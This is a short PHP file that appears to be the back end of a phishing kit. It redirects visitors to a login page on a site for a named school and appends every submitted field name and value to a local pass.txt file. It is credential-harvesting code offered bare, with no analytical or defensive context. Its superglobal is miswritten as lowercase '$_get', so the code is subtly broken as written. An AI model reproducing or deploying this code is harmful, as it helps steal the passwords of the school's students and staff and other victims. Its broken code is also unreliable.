<?php
header("location: https://smkmuhammadiyahkudus.fresto.biz/smkmuhammadiyahkudus/home/login.php ");
$handle = fopen ("pass.txt", "a");
foreach($_get as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>